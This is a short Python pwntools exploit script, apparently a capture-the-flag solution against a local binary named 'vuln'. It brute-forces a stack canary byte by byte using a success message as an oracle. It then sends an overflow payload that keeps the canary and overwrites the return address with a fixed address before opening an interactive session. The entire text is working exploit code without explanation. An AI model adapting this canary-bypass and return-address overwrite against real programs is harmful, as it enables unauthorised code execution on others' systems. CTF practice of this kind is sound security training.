from pwn import *

cookie = ''

context.log_level = 'ERROR'

for _ in range(4):
	for i in range(0x100):
		r = process('./vuln')

		r.sendafter('> ', str(len('\x00'*0x20 + cookie + chr(i))) + '\n')
		r.sendafter('> ', '\x00'*0x20 + cookie + chr(i) + '\n')

		if 'Ok... Now Where\'s the Flag?' in r.recvuntil('\n'):
			cookie += chr(i)
			print cookie
			r.close()
			break
		else:
			r.close()

context.log_level = 'INFO'

r = process('./vuln')

r.sendafter('> ', '200\n')
r.sendafter('> ', '\x00'*0x20 + cookie + '\x00'*0x10 + p64(0x80486eb))

r.interactive()
